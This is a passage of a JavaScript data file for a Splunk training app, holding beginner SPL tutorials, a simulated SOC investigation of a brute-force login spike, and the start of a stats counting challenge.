/**
 * Training Center - SPLUNKed
 * Curated learning pipelines with realistic SOC scenarios
 */

// ============================================
// Training Data
// ============================================

const TRAINING_DATA = {
    foundations: [
        {
            id: 'found-001',
            title: 'Anatomy of a Search',
            type: 'tutorial',
            difficulty: 'beginner',
            duration: '15 min',
            objectives: [
                'Understand the SPL search pipeline',
                'Identify different command types',
                'Read searches from left to right'
            ],
            tags: ['basics', 'pipeline', 'syntax'],
            description: 'Learn how SPL searches flow through the pipeline, from data retrieval to final output.',
            content: {
                sections: [
                    {
                        title: 'What is SPL?',
                        body: `<p>SPL (Search Processing Language) is Splunk's query language. Every search follows a <strong>pipeline model</strong> - data flows from left to right through a series of commands, each transforming the data in some way.</p>
                        <p>Think of it like an assembly line: raw events come in, get processed by each command in sequence, and refined results come out.</p>`,
                        spl: 'index=main | stats count by host | sort -count | head 10',
                        explanation: 'This search retrieves events from "main", counts them by host, sorts by count descending, and shows the top 10.'
                    },
                    {
                        title: 'The Pipe Character',
                        body: `<p>The <code>|</code> (pipe) character is the heart of SPL. It separates commands and passes results from one command to the next.</p>
                        <p>Each command after the pipe receives the output of the previous command as its input.</p>`,
                        spl: 'index=security sourcetype=linux_secure | where action="failure" | stats count by user',
                        explanation: 'Events flow: retrieve from index → filter failures → count by user.'
                    },
                    {
                        title: 'Command Types',
                        body: `<p>SPL commands fall into categories:</p>
                        <ul>
                            <li><strong>Streaming</strong>: Process events one at a time (where, eval, rex)</li>
                            <li><strong>Transforming</strong>: Aggregate events into statistics (stats, timechart, chart)</li>
                            <li><strong>Generating</strong>: Create events from scratch (makeresults, inputlookup)</li>
                            <li><strong>Ordering</strong>: Reorder results (sort, reverse, head, tail)</li>
                        </ul>`,
                        spl: null,
                        explanation: null
                    },
                    {
                        title: 'Reading a Search',
                        body: `<p>When reading an SPL search, work left to right and ask:</p>
                        <ol>
                            <li><strong>Where</strong> is data coming from? (index, sourcetype)</li>
                            <li><strong>What</strong> filtering happens? (where, search terms)</li>
                            <li><strong>How</strong> is it transformed? (stats, eval, rex)</li>
                            <li><strong>What</strong> is the output? (table, final aggregation)</li>
                        </ol>`,
                        spl: 'index=web sourcetype=access_combined status>=400 | stats count by status, uri_path | where count > 100 | sort -count',
                        explanation: 'Read as: "From web logs, find errors (400+), count by status and path, keep only those with 100+ occurrences, sort by most frequent."'
                    }
                ]
            }
        },
        {
            id: 'found-006',
            title: 'Indexes, Sourcetypes, and Finding Your Data',
            type: 'tutorial',
            difficulty: 'beginner',
            duration: '15 min',
            objectives: [
                'Understand how Splunk organizes data',
                'Choose the right index and sourcetype for your search',
                'Use metadata commands to explore available data'
            ],
            tags: ['basics', 'indexes', 'sourcetypes', 'metadata'],
            description: 'Learn how Splunk organizes data so you know where to look before you search.',
            content: {
                sections: [
                    {
                        title: 'The Data Hierarchy',
                        body: `<p>Splunk organizes data in a hierarchy:</p>
                        <ul>
                            <li><strong>Index</strong> — A repository of data (like a database). Examples: security, web, firewall</li>
                            <li><strong>Sourcetype</strong> — The format/type of data. Examples: syslog, access_combined, WinEventLog</li>
                            <li><strong>Source</strong> — Where the data came from. Examples: /var/log/messages, UDP:514</li>
                            <li><strong>Host</strong> — The machine that generated the data</li>
                        </ul>
                        <p>Every event has these four metadata fields. Using them makes searches faster and more accurate.</p>`,
                        spl: null,
                        explanation: null
                    },
                    {
                        title: 'Why Indexes Matter',
                        body: `<p>Indexes are the most important search filter. Specifying an index:</p>
                        <ul>
                            <li><strong>Speeds up searches</strong> — Splunk only looks in that index</li>
                            <li><strong>Reduces noise</strong> — You won't see unrelated events</li>
                            <li><strong>Respects permissions</strong> — You may only have access to certain indexes</li>
                        </ul>
                        <p><span style="color: #e74c3c;">Never use</span> <code>index=*</code> in production — it's slow and returns overwhelming results.</p>`,
                        spl: 'index=security earliest=-1h | stats count by sourcetype',
                        explanation: 'Searches only the security index and shows what sourcetypes are present in the last hour.'
                    },
                    {
                        title: 'Common Security Indexes',
                        body: `<p>Typical index organization in a SOC environment:</p>
                        <table style="width:100%; border-collapse: collapse; margin: 10px 0;">
                            <tr style="background: rgba(255,255,255,0.1);"><td style="padding:8px; border:1px solid #444;"><strong>Index</strong></td><td style="padding:8px; border:1px solid #444;"><strong>Contains</strong></td></tr>
                            <tr><td style="padding:8px; border:1px solid #444;">wineventlog</td><td style="padding:8px; border:1px solid #444;">Windows Security, System, Application logs</td></tr>
                            <tr><td style="padding:8px; border:1px solid #444;">linux_secure</td><td style="padding:8px; border:1px solid #444;">Linux authentication, sudo, SSH</td></tr>
                            <tr><td style="padding:8px; border:1px solid #444;">firewall</td><td style="padding:8px; border:1px solid #444;">Network traffic, blocked/allowed connections</td></tr>
                            <tr><td style="padding:8px; border:1px solid #444;">proxy</td><td style="padding:8px; border:1px solid #444;">Web proxy logs, URL filtering</td></tr>
                            <tr><td style="padding:8px; border:1px solid #444;">web</td><td style="padding:8px; border:1px solid #444;">Web server access logs</td></tr>
                            <tr><td style="padding:8px; border:1px solid #444;">dns</td><td style="padding:8px; border:1px solid #444;">DNS queries and responses</td></tr>
                            <tr><td style="padding:8px; border:1px solid #444;">sysmon</td><td style="padding:8px; border:1px solid #444;">Endpoint process, network, file events</td></tr>
                        </table>`,
                        spl: null,
                        explanation: null
                    },
                    {
                        title: 'Sourcetypes Identify Format',
                        body: `<p>The sourcetype tells Splunk how to parse the data. Different sourcetypes have different fields automatically extracted:</p>
                        <ul>
                            <li><code>WinEventLog:Security</code> — Has EventCode, TargetUserName, LogonType</li>
                            <li><code>access_combined</code> — Has status, uri_path, method, bytes</li>
                            <li><code>syslog</code> — Has facility, severity, process</li>
                        </ul>`,
                        spl: 'index=wineventlog sourcetype="WinEventLog:Security" EventCode=4625 | head 5 | table _time, EventCode, TargetUserName, IpAddress',
                        explanation: 'Using both index and sourcetype focuses on Windows Security events, where EventCode and TargetUserName are pre-extracted.'
                    },
                    {
                        title: 'Discovering Available Indexes',
                        body: `<p>Use the <code>eventcount</code> command or <code>| metadata</code> to explore what data exists:</p>`,
                        spl: '| eventcount summarize=false index=* | table index, count | sort -count',
                        explanation: 'Shows all indexes you have access to and how many events are in each.'
                    },
                    {
                        title: 'Exploring Sourcetypes',
                        body: `<p>Once you pick an index, see what sourcetypes it contains:</p>`,
                        spl: '| metadata type=sourcetypes index=security | table sourcetype, totalCount, recentTime | sort -totalCount',
                        explanation: 'Lists all sourcetypes in the security index with event counts and last event time.'
                    },
                    {
                        title: 'Discovering Fields',
                        body: `<p>When you encounter a new sourcetype, explore what fields are available:</p>
                        <ul>
                            <li><code>| fieldsummary</code> — Shows all fields with statistics</li>
                            <li><code>| fields</code> — Lists available fields</li>
                            <li>Click "All Fields" in the Splunk UI sidebar</li>
                        </ul>`,
                        spl: 'index=firewall sourcetype=pan:traffic | head 1000 | fieldsummary | where count > 500 | table field, count, distinct_count | sort -count',
                        explanation: 'Analyzes 1000 firewall events to find commonly-populated fields. Fields appearing in most events are likely the most useful.'
                    },
                    {
                        title: 'The _raw and _time Fields',
                        body: `<p>Two special fields exist in every event:</p>
                        <ul>
                            <li><code>_raw</code> — The complete original event text</li>
                            <li><code>_time</code> — The timestamp (in epoch seconds)</li>
                        </ul>
                        <p>When automatic field extraction fails, you can always parse <code>_raw</code> with rex.</p>`,
                        spl: 'index=linux_secure | head 1 | table _time, _raw',
                        explanation: 'Shows the raw event exactly as it was ingested, plus the parsed timestamp.'
                    },
                    {
                        title: 'Building Your Search Strategy',
                        body: `<p>When starting an investigation:</p>
                        <ol>
                            <li><strong>Identify the data type</strong> — Authentication? Network? Endpoint?</li>
                            <li><strong>Find the index</strong> — Use eventcount or ask your Splunk admin</li>
                            <li><strong>Check the sourcetype</strong> — Different vendors have different formats</li>
                            <li><strong>Explore the fields</strong> — Use fieldsummary to understand what's available</li>
                            <li><strong>Write your search</strong> — Start specific: index + sourcetype + key fields</li>
                        </ol>`,
                        spl: 'index=wineventlog sourcetype="WinEventLog:Security" | stats count by EventCode | sort -count | head 20',
                        explanation: 'A good first search: pick your index and sourcetype, then see what event types are most common.'
                    }
                ]
            }
        },
        {
            id: 'found-007',
            title: 'Search Syntax Essentials',
            type: 'tutorial',
            difficulty: 'beginner',
            duration: '15 min',
            objectives: [
                'Combine search terms with AND, OR, NOT correctly',
                'Use wildcards and quotes for precise matching',
                'Avoid common syntax mistakes that return wrong results'
            ],
            tags: ['basics', 'syntax', 'boolean', 'search'],
            description: 'Master the fundamentals of SPL search syntax to write accurate, efficient queries.',
            content: {
                sections: [
                    {
                        title: 'Implicit AND',
                        body: `<p>When you write multiple terms in a search, Splunk treats them as AND by default:</p>
                        <pre>index=security failed password</pre>
                        <p>This finds events containing "failed" AND "password". Both terms must appear.</p>
                        <p><strong>Important:</strong> Spaces between terms mean AND. You don't need to write it explicitly.</p>`,
                        spl: 'index=security failed login | head 10',
                        explanation: 'Finds events containing both "failed" AND "login" in the security index.'
                    },
                    {
                        title: 'Using OR',
                        body: `<p>Use OR to match any of several terms. <strong>Critical:</strong> OR has lower precedence than AND, so use parentheses!</p>
                        <p><span style="color: #e74c3c;">✗ Wrong:</span> <code>index=web status=404 OR 500</code> — This means (index=web AND status=404) OR (500 anywhere)</p>
                        <p><span style="color: #27ae60;">✓ Right:</span> <code>index=web (status=404 OR status=500)</code> — This correctly finds 404 or 500 status codes</p>`,
                        spl: 'index=web (status=404 OR status=500 OR status=503) | stats count by status',
                        explanation: 'Parentheses group the OR conditions, so all three status codes are checked against the status field.'
                    },
                    {
                        title: 'Using NOT',
                        body: `<p>Exclude events with NOT. You can also use != for field values:</p>
                        <ul>
                            <li><code>NOT error</code> — Exclude events containing "error"</li>
                            <li><code>status!=200</code> — Exclude status code 200</li>
                            <li><code>NOT (status=200 OR status=304)</code> — Exclude successful responses</li>
                        </ul>`,
                        spl: 'index=web NOT status=200 NOT status=304 | stats count by status | sort -count',
                        explanation: 'Shows all non-successful HTTP responses by excluding 200 (OK) and 304 (Not Modified).'
                    },
                    {
                        title: 'Wildcards',
                        body: `<p>The asterisk <code>*</code> matches any characters:</p>
                        <ul>
                            <li><code>fail*</code> — Matches fail, failed, failure, failing</li>
                            <li><code>*.exe</code> — Matches any .exe filename</li>
                            <li><code>10.0.0.*</code> — Matches any IP in the 10.0.0.x subnet</li>
                            <li><code>*admin*</code> — Matches anything containing "admin"</li>
                        </ul>
                        <p><strong>Performance tip:</strong> Leading wildcards (<code>*admin</code>) are slower than trailing wildcards (<code>admin*</code>).</p>`,
                        spl: 'index=wineventlog user=*admin* | stats count by user',
                        explanation: 'Finds all events where the user field contains "admin" anywhere in the value.'
                    },
                    {
                        title: 'Exact Phrases with Quotes',
                        body: `<p>Use double quotes to search for exact phrases:</p>
                        <ul>
                            <li><code>"failed login"</code> — Exact phrase match</li>
                            <li><code>"192.168.1.1"</code> — Treats dots as literal (not wildcards)</li>
                            <li><code>error message</code> — Two separate words (both must appear, any order)</li>
                            <li><code>"error message"</code> — Exact phrase in that order</li>
                        </ul>`,
                        spl: 'index=linux_secure "authentication failure" | stats count by host',
                        explanation: 'Finds the exact phrase "authentication failure" — not events with just "authentication" or just "failure".'
                    },
                    {
                        title: 'Field-Value Syntax',
                        body: `<p>Always use <code>field=value</code> when searching specific fields. This is faster and more accurate than free-text search.</p>
                        <ul>
                            <li><code>status=404</code> — Field equals value</li>
                            <li><code>status!=404</code> — Field not equal to value</li>
                            <li><code>status>399</code> — Numeric comparison</li>
                            <li><code>status IN (400, 401, 403, 404)</code> — Match any in list</li>
                        </ul>`,
                        spl: 'index=firewall action=blocked dest_port IN (22, 23, 3389) | stats count by src_ip, dest_port',
                        explanation: 'Finds blocked connections to sensitive ports (SSH, Telnet, RDP) using field=value syntax and IN operator.'
                    },
                    {
                        title: 'Case Sensitivity',
                        body: `<p>By default, Splunk searches are <strong>case-insensitive</strong> for text matching:</p>
                        <ul>
                            <li><code>error</code> matches "Error", "ERROR", "error"</li>
                            <li>Field names are always case-sensitive: <code>Status</code> ≠ <code>status</code></li>
                            <li>Use <code>| where</code> for case-sensitive matching if needed</li>
                        </ul>`,
                        spl: 'index=app_logs | where match(message, "ERROR") | head 10',
                        explanation: 'The where command with match() provides case-sensitive searching when needed.'
                    },
                    {
                        title: 'Common Mistakes to Avoid',
                        body: `<p><strong>Mistake 1:</strong> Forgetting parentheses with OR</p>
                        <pre style="color: #e74c3c;">index=web status=200 OR status=404</pre>
                        <p>This actually means: (index=web AND status=200) OR (status=404 in any index)</p>

                        <p><strong>Mistake 2:</strong> Using AND explicitly when not needed</p>
                        <pre>index=web AND status=404 AND host=web01</pre>
                        <p>Works, but <code>index=web status=404 host=web01</code> is cleaner.</p>

                        <p><strong>Mistake 3:</strong> Wildcards in quotes</p>
                        <pre style="color: #e74c3c;">"user=admin*"</pre>
                        <p>The * is treated literally inside quotes. Use: <code>user=admin*</code></p>`,
                        spl: null,
                        explanation: null
                    }
                ]
            }
        },
        {
            id: 'found-002',
            title: 'Understanding Time in Splunk',
            type: 'tutorial',
            difficulty: 'beginner',
            duration: '20 min',
            objectives: [
                'Use time range pickers effectively',
                'Apply earliest and latest modifiers',
                'Create time-based visualizations'
            ],
            tags: ['basics', 'time', 'timechart'],
            description: 'Master time concepts in Splunk - from relative time modifiers to time-series analysis.',
            content: {
                sections: [
                    {
                        title: 'Relative Time Modifiers',
                        body: `<p>Splunk uses intuitive time modifiers:</p>
                        <ul>
                            <li><code>-1h</code> = 1 hour ago</li>
                            <li><code>-7d</code> = 7 days ago</li>
                            <li><code>-1w</code> = 1 week ago</li>
                            <li><code>@d</code> = snap to beginning of day</li>
                            <li><code>@h</code> = snap to beginning of hour</li>
                        </ul>`,
                        spl: 'index=security earliest=-24h@h latest=now',
                        explanation: 'Search from 24 hours ago (snapped to the hour) until now.'
                    },
                    {
                        title: 'The timechart Command',
                        body: `<p><code>timechart</code> is essential for time-series analysis. It automatically buckets events by time and calculates statistics.</p>
                        <p>Use span= to control bucket size.</p>`,
                        spl: 'index=web | timechart span=1h count by status',
                        explanation: 'Creates an hourly chart showing event counts for each HTTP status code.'
                    },
                    {
                        title: 'Time-Based Filtering',
                        body: `<p>Use time fields for precise filtering:</p>
                        <ul>
                            <li><code>_time</code> - when Splunk indexed the event</li>
                            <li>Custom time fields from your data</li>
                            <li><code>earliest=</code> and <code>latest=</code> in search</li>
                        </ul>`,
                        spl: 'index=firewall | where _time >= relative_time(now(), "-1h") | stats count by src_ip',
                        explanation: 'Filter to events from the last hour using the where command.'
                    },
                    {
                        title: 'Comparing Time Periods',
                        body: `<p>Compare current data to historical baselines using time modifiers in subsearches or append.</p>`,
                        spl: 'index=web | timechart span=1h count | appendcols [search index=web earliest=-7d@d latest=-6d@d | timechart span=1h count | rename count as "Last Week"]',
                        explanation: 'Compare current hourly traffic to the same period last week.'
                    }
                ]
            }
        },
        {
            id: 'found-008',
            title: 'Creating Fields with Eval',
            type: 'tutorial',
            difficulty: 'beginner',
            duration: '20 min',
            objectives: [
                'Create calculated fields from existing data',
                'Use conditional logic with if and case',
                'Apply common eval functions for data transformation'
            ],
            tags: ['basics', 'eval', 'calculated-fields', 'functions'],
            description: 'Learn to transform, calculate, and enrich your data using the versatile eval command.',
            content: {
                sections: [
                    {
                        title: 'What is Eval?',
                        body: `<p>The <code>eval</code> command creates new fields or modifies existing ones using expressions. It's one of the most frequently used SPL commands.</p>
                        <pre>| eval new_field = expression</pre>
                        <p>The expression can include math, string operations, conditionals, and functions.</p>`,
                        spl: 'index=firewall | eval total_bytes = bytes_in + bytes_out | table src_ip, bytes_in, bytes_out, total_bytes',
                        explanation: 'Creates a new field "total_bytes" by adding bytes_in and bytes_out together.'
                    },
                    {
                        title: 'Basic Math Operations',
                        body: `<p>Eval supports standard arithmetic:</p>
                        <ul>
                            <li><code>+</code> Addition</li>
                            <li><code>-</code> Subtraction</li>
                            <li><code>*</code> Multiplication</li>
                            <li><code>/</code> Division</li>
                            <li><code>%</code> Modulo (remainder)</li>
                        </ul>`,
                        spl: 'index=firewall | eval mb_out = round(bytes_out / 1024 / 1024, 2) | eval transfer_ratio = round(bytes_out / bytes_in, 2) | table src_ip, mb_out, transfer_ratio',
                        explanation: 'Converts bytes to megabytes and calculates the ratio of outbound to inbound traffic.'
                    },
                    {
                        title: 'The if() Function',
                        body: `<p>Create conditional values with <code>if(condition, true_value, false_value)</code>:</p>`,
                        spl: 'index=web | eval status_type = if(status >= 400, "error", "success") | stats count by status_type',
                        explanation: 'Labels each request as "error" or "success" based on HTTP status code, then counts each category.'
                    },
                    {
                        title: 'The case() Function',
                        body: `<p>For multiple conditions, use <code>case()</code> instead of nested if statements:</p>
                        <pre>case(condition1, value1, condition2, value2, ..., true(), default)</pre>
                        <p>Conditions are evaluated in order. Use <code>true()</code> as the final condition for a default value.</p>`,
                        spl: 'index=web | eval status_category = case(status < 300, "success", status < 400, "redirect", status < 500, "client_error", status >= 500, "server_error", true(), "unknown") | stats count by status_category',
                        explanation: 'Categorizes HTTP status codes into descriptive groups using multiple conditions.'
                    },
                    {
                        title: 'String Functions',
                        body: `<p>Common string manipulation functions:</p>
                        <ul>
                            <li><code>lower(x)</code> / <code>upper(x)</code> — Change case</li>
                            <li><code>len(x)</code> — String length</li>
                            <li><code>substr(x, start, length)</code> — Extract substring</li>
                            <li><code>replace(x, old, new)</code> — Replace text</li>
                            <li><code>split(x, delim)</code> — Split into multivalue</li>
                            <li><code>trim(x)</code> / <code>ltrim(x)</code> / <code>rtrim(x)</code> — Remove whitespace</li>
                        </ul>`,
                        spl: 'index=web | eval domain = lower(host) | eval short_uri = substr(uri_path, 1, 30) | table domain, short_uri, status',
                        explanation: 'Normalizes hostname to lowercase and truncates long URIs for cleaner output.'
                    },
                    {
                        title: 'Working with Time',
                        body: `<p>Time functions are essential for SOC analysis:</p>
                        <ul>
                            <li><code>now()</code> — Current timestamp</li>
                            <li><code>strftime(_time, format)</code> — Format timestamp as string</li>
                            <li><code>strptime(string, format)</code> — Parse string to timestamp</li>
                            <li><code>relative_time(time, modifier)</code> — Calculate relative time</li>
                        </ul>`,
                        spl: 'index=vpn | eval hour = strftime(_time, "%H") | eval day = strftime(_time, "%A") | eval age_hours = round((now() - _time) / 3600, 1) | table user, day, hour, age_hours',
                        explanation: 'Extracts the hour and day name from event time, and calculates how many hours ago the event occurred.'
                    },
                    {
                        title: 'Null and Coalesce',
                        body: `<p>Handle missing values gracefully:</p>
                        <ul>
                            <li><code>isnull(x)</code> — Returns true if field is null</li>
                            <li><code>isnotnull(x)</code> — Returns true if field has a value</li>
                            <li><code>coalesce(x, y, z)</code> — Returns first non-null value</li>
                            <li><code>nullif(x, y)</code> — Returns null if x equals y</li>
                        </ul>`,
                        spl: 'index=firewall | eval src_host = coalesce(src_hostname, src_ip, "unknown") | stats count by src_host',
                        explanation: 'Uses hostname if available, falls back to IP, then to "unknown" if both are missing.'
                    },
                    {
                        title: 'Multiple Eval Statements',
                        body: `<p>You can chain multiple assignments in one eval using commas, or use separate eval commands:</p>`,
                        spl: 'index=firewall | eval mb_in = round(bytes_in/1024/1024, 2), mb_out = round(bytes_out/1024/1024, 2), direction = if(mb_out > mb_in, "outbound", "inbound") | table src_ip, mb_in, mb_out, direction',
                        explanation: 'Creates three new fields in a single eval command, with the third field depending on the first two.'
                    },
                    {
                        title: 'Type Conversion',
                        body: `<p>Convert between types when needed:</p>
                        <ul>
                            <li><code>tonumber(x)</code> — Convert to number</li>
                            <li><code>tostring(x)</code> — Convert to string</li>
                            <li><code>tostring(x, "hex")</code> — Convert to hexadecimal</li>
                            <li><code>tostring(x, "commas")</code> — Number with comma separators</li>
                        </ul>`,
                        spl: 'index=firewall | stats sum(bytes_out) as total_bytes by src_ip | eval formatted = tostring(total_bytes, "commas") | eval hex_bytes = tostring(total_bytes, "hex") | table src_ip, formatted, hex_bytes',
                        explanation: 'Demonstrates formatting numbers with commas for readability and converting to hexadecimal.'
                    }
                ]
            }
        },
        {
            id: 'found-009',
            title: 'Extracting Fields with Rex',
            type: 'tutorial',
            difficulty: 'beginner',
            duration: '25 min',
            objectives: [
                'Write basic regex patterns for common data types',
                'Use rex to create new fields from raw events',
                'Handle multiple captures and optional matches'
            ],
            tags: ['basics', 'rex', 'regex', 'field-extraction'],
            description: 'Learn to parse unstructured log data and extract the fields you need using regular expressions.',
            content: {
                sections: [
                    {
                        title: 'Why Field Extraction Matters',
                        body: `<p>Not all data arrives with neat, pre-defined fields. Many logs come as raw text that Splunk can't automatically parse. The <code>rex</code> command lets you extract specific values using regular expressions (regex).</p>
                        <p>As a SOC analyst, you'll encounter logs from custom applications, legacy systems, and edge devices that require manual field extraction. Mastering rex is essential.</p>`,
                        spl: null,
                        explanation: null
                    },
                    {
                        title: 'Basic Rex Syntax',
                        body: `<p>The rex command uses named capture groups to create fields:</p>
                        <pre>| rex field=_raw "(?&lt;field_name&gt;pattern)"</pre>
                        <p>The <code>(?&lt;name&gt;...)</code> syntax captures whatever matches the pattern inside and assigns it to a field called "name".</p>`,
                        spl: 'index=web | rex field=_raw "(?<client_ip>\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})" | table _time, client_ip, _raw',
                        explanation: 'This extracts an IP address pattern (4 groups of 1-3 digits separated by dots) into a field called client_ip.'
                    },
                    {
                        title: 'Common Extraction Patterns',
                        body: `<p>Memorize these building blocks:</p>
                        <ul>
                            <li><code>\\d+</code> — One or more digits</li>
                            <li><code>\\w+</code> — One or more word characters (letters, digits, underscore)</li>
                            <li><code>[^\\s]+</code> — One or more non-whitespace characters</li>
                            <li><code>[^"]+</code> — Everything until a quote (useful for quoted strings)</li>
                            <li><code>.*?</code> — Any characters (non-greedy)</li>
                        </ul>`,
                        spl: 'index=linux_secure | rex field=_raw "user=(?<username>\\w+)" | rex field=_raw "src=(?<source_ip>[^\\s]+)" | stats count by username, source_ip',
                        explanation: 'Extracts username after "user=" and source IP after "src=" from Linux auth logs.'
                    },
                    {
                        title: 'Extracting from Structured Patterns',
                        body: `<p>Most logs follow patterns. Use literal text as anchors to find what you need:</p>
                        <p>Example log: <code>2024-01-15 10:23:45 ERROR [AuthService] Failed login for user "jsmith" from 192.168.1.50</code></p>`,
                        spl: 'index=app_logs | rex field=_raw "\\[(?<service>\\w+)\\].*user \\"(?<user>[^\\"]+)\\".*from (?<src_ip>\\d+\\.\\d+\\.\\d+\\.\\d+)" | table _time, service, user, src_ip',
                        explanation: 'We anchor on "[" for service name, "user \\"" for username (note the escaped quotes), and "from " for the IP address.'
                    },
                    {
                        title: 'Multiple Captures in One Rex',
                        body: `<p>You can capture multiple fields in a single rex command. This is more efficient than multiple rex commands.</p>`,
                        spl: 'index=firewall | rex field=_raw "src=(?<src_ip>[^\\s]+)\\s+dst=(?<dst_ip>[^\\s]+)\\s+proto=(?<protocol>\\w+)\\s+action=(?<action>\\w+)" | stats count by src_ip, dst_ip, protocol, action',
                        explanation: 'Extracts four fields in one pass: source IP, destination IP, protocol, and action from firewall logs.'
                    },
                    {
                        title: 'Handling Optional Fields',
                        body: `<p>Some fields may not appear in every event. Use <code>?</code> to make parts optional:</p>
                        <ul>
                            <li><code>(?:pattern)?</code> — Makes an entire group optional</li>
                            <li><code>pattern*</code> — Zero or more occurrences</li>
                        </ul>`,
                        spl: 'index=web | rex field=_raw "status=(?<status>\\d+)(?:\\s+bytes=(?<bytes>\\d+))?" | table status, bytes',
                        explanation: 'Status is always captured, but bytes is optional — it will be null if not present in the event.'
                    },
                    {
                        title: 'Rex in sed Mode',
                        body: `<p>Rex can also replace text using <code>mode=sed</code>. This is useful for masking sensitive data or cleaning up fields:</p>`,
                        spl: 'index=app_logs | rex field=_raw mode=sed "s/password=\\S+/password=REDACTED/g" | table _raw',
                        explanation: 'Replaces any password value with "REDACTED" using sed-style substitution.'
                    },
                    {
                        title: 'Practice: Parse a Complex Log',
                        body: `<p>Given this Apache access log format:</p>
                        <pre>192.168.1.50 - jsmith [15/Jan/2024:10:23:45 -0500] "GET /api/users HTTP/1.1" 200 1234</pre>
                        <p>Extract: client IP, username, HTTP method, URI path, status code, and response size.</p>`,
                        spl: 'index=web sourcetype=access_combined | rex field=_raw "^(?<client_ip>\\S+)\\s+\\S+\\s+(?<user>\\S+)\\s+\\[[^\\]]+\\]\\s+\\"(?<method>\\w+)\\s+(?<uri>\\S+)[^\\"]*\\"\\s+(?<status>\\d+)\\s+(?<bytes>\\d+)" | table client_ip, user, method, uri, status, bytes',
                        explanation: 'A complete Apache log parser. Each field is anchored by the known log structure: IP first, then dash, username, bracketed timestamp, quoted request line, status, and bytes.'
                    }
                ]
            }
        },
        {
            id: 'found-003',
            title: 'Your First Alert Investigation',
            type: 'scenario',
            difficulty: 'beginner',
            duration: '20 min',
            objectives: [
                'Respond to a basic security alert',
                'Analyze authentication patterns',
                'Document findings systematically'
            ],
            tags: ['authentication', 'windows', 'security', 'basics'],
            description: 'Investigate a spike in failed login attempts - your first SOC investigation scenario.',
            content: {
                situation: `You're a junior SOC analyst and receive an alert: "500% increase in failed authentication events in the last hour." Your task is to investigate and determine if this is a threat or false positive.`,
                steps: [
                    {
                        question: 'First, let\'s confirm the alert. How would you see the volume of failed logins over time?',
                        hint: 'Think about counting events over time periods. Which command creates time-based charts?',
                        spl: 'index=wineventlog EventCode=4625 earliest=-4h | timechart span=10m count',
                        analysis: 'This shows failed login (EventCode 4625) volume in 10-minute buckets over the last 4 hours.',
                        output: {
                            columns: ['_time', 'count'],
                            rows: [
                                { '_time': '2024-01-15 10:00', 'count': '18' },
                                { '_time': '2024-01-15 10:10', 'count': '22' },
                                { '_time': '2024-01-15 10:20', 'count': '19' },
                                { '_time': '2024-01-15 11:50', 'count': '487' },
                                { '_time': '2024-01-15 12:00', 'count': '523' }
                            ],
                            truncated: 'Showing 5 of 24 time buckets'
                        },
                        finding: 'Confirmed: We see a clear spike starting around 2 hours ago, with counts jumping from baseline ~20 to over 500 per 10-minute window.'
                    },
                    {
                        question: 'The spike is real. Now let\'s identify WHO is being targeted. Which accounts are seeing the most failures?',
                        hint: 'You need to count failures grouped by the target account field.',
                        spl: 'index=wineventlog EventCode=4625 earliest=-2h | stats count by TargetUserName | sort -count | head 20',
                        analysis: 'This counts failed logins by target username and shows the top 20.',
                        output: {
                            columns: ['TargetUserName', 'count'],
                            rows: [
                                { 'TargetUserName': 'administrator', 'count': '3247' },
                                { 'TargetUserName': 'admin', 'count': '3189' },
                                { 'TargetUserName': 'root', 'count': '412' },
                                { 'TargetUserName': 'svc_backup', 'count': '5' },
                                { 'TargetUserName': 'svc_sql', 'count': '3' }
                            ],
                            truncated: 'Showing 5 of 20 results'
                        },
                        finding: 'Critical: The "administrator" and "admin" accounts have 3,000+ failures each. Service accounts like "svc_backup" show only normal baseline failures (~5 each).'
                    },
                    {
                        question: 'Administrator accounts are being targeted. Where are these attempts coming from?',
                        hint: 'Look at source IP addresses or workstation names.',
                        spl: 'index=wineventlog EventCode=4625 earliest=-2h TargetUserName IN ("administrator", "admin") | stats count by IpAddress | sort -count',
                        analysis: 'This shows which IP addresses are generating the failed logins for admin accounts.',
                        output: {
                            columns: ['IpAddress', 'count'],
                            rows: [
                                { 'IpAddress': '10.45.23.99', 'count': '6436' }
                            ]
                        },
                        finding: 'All 6,000+ failures originate from a single IP: 10.45.23.99. This is NOT distributed - it\'s one source.'
                    },
                    {
                        question: 'Single source attacking admin accounts - this looks like brute force. Has the attacker succeeded? Check for any successful logins from that IP.',
                        hint: 'EventCode 4624 is successful login. Look for the suspicious IP.',
                        spl: 'index=wineventlog EventCode=4624 earliest=-2h IpAddress="10.45.23.99" | stats count by TargetUserName, LogonType',
                        analysis: 'This checks if the attacking IP has any successful authentications.',
                        output: {
                            columns: ['TargetUserName', 'LogonType', 'count'],
                            rows: [],
                            emptyMessage: 'No results found'
                        },
                        finding: 'Good news: Zero successful logins from the attacking IP. The brute force attempt has not succeeded.'
                    },
                    {
                        question: 'Let\'s identify the attacking system. Is this IP internal or external? What do we know about it?',
                        hint: 'Check asset inventory or DHCP logs for IP context.',
                        spl: 'index=asset_inventory ip="10.45.23.99" | table hostname, department, owner, last_seen',
                        analysis: 'Cross-reference with asset inventory to identify the source machine.',
                        output: {
                            columns: ['hostname', 'department', 'owner', 'last_seen'],
                            rows: [
                                { 'hostname': 'WKS-RECEPTION-02', 'department': 'Lobby', 'owner': 'Shared Kiosk', 'last_seen': '2024-01-15 12:05' }
                            ]
                        },
                        finding: 'The IP belongs to "WKS-RECEPTION-02" in the Lobby. This is a shared kiosk PC that shouldn\'t be making admin login attempts.'
                    }
                ],
                conclusion: `<strong>Investigation Complete!</strong><br><br>
                    <strong>Summary:</strong> Confirmed brute force attack against administrator accounts from an internal kiosk PC (10.45.23.99 / WKS-RECEPTION-02).<br><br>
                    <strong>Impact:</strong> No successful compromise - all attempts failed.<br><br>
                    <strong>Recommended Actions:</strong>
                    <ol>
                        <li>Isolate WKS-RECEPTION-02 from the network immediately</li>
                        <li>Check the physical kiosk for unauthorized access or malware</li>
                        <li>Review logs for how the attack was initiated (removable media? physical access?)</li>
                        <li>Consider blocking authentication attempts from kiosk systems to admin accounts</li>
                    </ol>`
            }
        },
        {
            id: 'found-004',
            title: 'Count Events',
            type: 'challenge',
            difficulty: 'beginner',
            duration: '10 min',
            objectives: [
                'Use the stats command',
                'Count events with grouping',
                'Understand count vs dc (distinct count)'
            ],
            tags: ['basics', 'aggregation', 'stats'],
            description: 'Practice the fundamental skill of counting and summarizing events.',
            content: {
                problem: 'You need to analyze web server logs. Find the total number of requests per HTTP status code (200, 404, 500, etc.) from the web index.',
                hints: [
                    'The stats command is used for aggregation',
                    'Use count to count events',
                    'Use "by" to group by a field (status)'
                ],
                solution: {
                    spl: 'index=web | stats count by status',
